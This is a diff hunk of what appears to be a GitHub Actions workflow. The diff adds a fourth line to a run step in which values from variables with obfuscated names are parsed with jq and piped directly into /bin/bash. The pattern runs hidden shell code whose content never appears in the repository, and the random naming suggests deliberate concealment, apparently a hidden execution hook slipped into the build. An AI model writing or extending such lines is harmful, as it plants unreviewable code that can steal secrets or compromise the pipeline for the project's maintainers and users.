@@ -31,6 +31,7 @@ jobs:
           echo $gclun50 | jq -r .pafrs45 | /bin/bash
           echo $kc1 | jq -r .ogo51 | /bin/bash
           printf '%s' "$b864" | jq -r .lwsap81213 | /bin/bash
+          printf '%s' "$npwyg53758" | jq -r .wzku550 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
